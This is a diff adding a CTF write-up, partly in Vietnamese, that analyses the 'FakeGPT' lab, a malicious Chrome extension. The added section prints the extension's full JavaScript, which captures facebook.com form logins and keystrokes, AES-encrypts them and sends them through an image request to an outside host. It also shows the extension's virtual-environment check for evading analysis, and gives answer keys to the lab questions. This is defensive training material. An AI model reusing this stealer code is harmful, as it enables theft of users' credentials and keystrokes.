@@ -4783,6 +4783,155 @@ We actually found `Cocainit`, `VNvodich`, and `Siuuuuuu`.
 - **The second encryption class - Symmetric Cryptography:** Attacker used PowerShell to encrypt `T3C4U` by through AES. This script was entirely executed on memory (fileless execution) through Base64 and Deflate (lossless compression) to evade anti-virus softwares.
 - **Defense Evasion**: The last encrypted file was renamed `recycle.bin` to be disguised as recycle bin of system.
 
+### VII. FakeGPT Lab:
+> Analyze a malicious Chrome extension's code and behavior to identify data theft mechanisms, covert exfiltration via `<img>` tags, and anti-analysis techniques.
+- [Link bài lab](https://cyberdefenders.org/blueteam-ctf-challenges/fakegpt/)
+- Kịch bản:
+![image](https://hackmd.io/_uploads/H1ECkZlncGx.png)
+
+#### 1. Which encoding method does the browser extension use to obscure target URLs, making them more difficult to detect during analysis?
+Using FTK to analyse this challenge. In `app.js`:
+``` js
+(function() {
+    var _0xabc1 = function(_0x321a) {
+        return atob(_0x321a);
+    };
+    var _0x5eaf = function(_0x5fa1) {
+        return btoa(_0x5fa1);
+    };
+
+    const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
+    if (targets.indexOf(window.location.hostname) !== -1) {
+        document.addEventListener('submit', function(event) {
+            let form = event.target;
+            let formData = new FormData(form);
+            let username = formData.get('username') || formData.get('email');
+            let password = formData.get('password');
+
+            if (username && password) {
+                exfiltrateCredentials(username, password);
+            }
+        });
+
+        document.addEventListener('keydown', function(event) {
+            var key = event.key;
+            exfiltrateData('keystroke', key);
+        });
+    }
+
+    function exfiltrateCredentials(username, password) {
+        const payload = { user: username, pass: password, site: window.location.hostname };
+        const encryptedPayload = encryptPayload(JSON.stringify(payload));
+        sendToServer(encryptedPayload);
+    }
+
+    function encryptPayload(data) {
+        const key = CryptoJS.enc.Utf8.parse('SuperSecretKey123');
+        const iv = CryptoJS.lib.WordArray.random(16);
+        const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
+        return iv.concat(encrypted.ciphertext).toString(CryptoJS.enc.Base64);
+    }
+
+    function sendToServer(encryptedData) {
+        var img = new Image();
+        img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
+        document.body.appendChild(img);
+    }
+
+    function exfiltrateData(type, data) {
+        const payload = { type: type, data: data, site: window.location.hostname };
+        const encryptedPayload = encryptPayload(JSON.stringify(payload));
+        sendToServer(encryptedPayload);
+    }
+})();
+```
+In general, if the sensitive information of victim is stealed, it will be encrypted by AES with key `SuperSecretKey123`, then `encryptedPayload` will be sent to sever as an image (`'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);`). There is a base64 code in the above script:
+![image](https://hackmd.io/_uploads/B1OzJ4a5Gx.png)
+Decode it:
+![image](https://hackmd.io/_uploads/SJdQk4T5zl.png)
+It is the URL of Facebook.
+
+**$\rightarrow$ Đáp án: `base64`**
+
+#### 2. Which website does the extension monitor for data theft, targeting user accounts to steal sensitive information?
+After base64-encoding, I get `www.facebook.com`.
+
+**$\rightarrow$ Đáp án: `www.facebook.com`**
+
+#### 3. Which type of HTML element is utilized by the extension to send stolen data?
+In `sendToServer()` function:
+![image](https://hackmd.io/_uploads/SJIzNEpqMx.png)
+
+**$\rightarrow$ Đáp án: `<img>`**
+
+#### 4. What is the first specific condition in the code that triggers the extension to deactivate itself?
+In `loader.js`:
+``` js
+(function() {
+    var _0xabc1 = function(_0x321a) {
+        return _0x321a;
+    };
+    // Check if the browser is in a virtual environment
+    if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
+        alert("Virtual environment detected. Extension will disable itself.");
+        chrome.runtime.onMessage.addListener(() => { return false; });
+    }
+
+    // Load additional scripts dynamically
+    function loadScript(url, callback) {
+        var script = document.createElement('script');
+        script.src = url;
+        script.onload = callback;
+        document.head.appendChild(script);
+    }
+
+    // Load and execute the core functionality
+    loadScript('core/app.js', function() {
+        console.log('Core functionality loaded.');
+    });
+})();
+```
+In general, the server checks if the browser is in a virtual environment, extension will disable itself. Then, the additional script will loaded dynamically, and finally, the core functionality will be loaded and executed. As we can see, there are two conditions trigging the extension to deactivate itself. The first condition is check whether `navigator.plugins.length` equals `0`.
+
+**$\rightarrow$ Đáp án: `navigator.plugins.length === 0`**
+
+#### 5. Which event does the extension capture to track user input submitted through forms?
+It's when the victim `submit` the form:
+![image](https://hackmd.io/_uploads/HkgaUE6qfx.png)
+
+**$\rightarrow$ Đáp án: `submit`**
+
+#### 6. Which API or method does the extension use to capture and monitor user keystrokes?
+The attacker uses `keydown` to steal the data of the key that user have just pressed:
+![image](https://hackmd.io/_uploads/BkA7vVpcfx.png)
+
+**$\rightarrow$ Đáp án: `keydown`**
+
+#### 7. What is the domain where the extension transmits the exfiltrated data?
+It is `Mo.Elshaheedy.com`:
+![image](https://hackmd.io/_uploads/rJbX_N6cze.png)
+
+**$\rightarrow$ Đáp án: `Mo.Elshaheedy.com`**
+
+#### 8. Which function in the code is used to exfiltrate user credentials, including the username and password?
+As I mentioned before, it is `exfiltrateCredentials(username, password);` function:
+![image](https://hackmd.io/_uploads/r12UuNpqMg.png)
+![image](https://hackmd.io/_uploads/SysFOVT9ze.png)
+
+**$\rightarrow$ Đáp án: `exfiltrateCredentials(username, password);`**
+
+#### 9. Which encryption algorithm is applied to secure the data before sending?
+It is `AES`:
+![image](https://hackmd.io/_uploads/r1wTuNT9Ge.png)
+
+**$\rightarrow$ Đáp án: `AES`**
+
+#### 10. What does the extension access to store or manipulate session-related data and authentication information?
+We need to find the objective that the extension access to, in other words, the resource that the extension interact with. In `manifest.json`:
+![image](https://hackmd.io/_uploads/SJlzR4acMe.png)
+It is `cookies`.
+**$\rightarrow$ Đáp án: `cookies`**
+
 ## Viblo CTF:
 ### I. NetLab1: Sharing:
 > Link bài lab: https://ctf.viblo.asia/puzzles/netlab1-sharing-7ftcbkfnovy
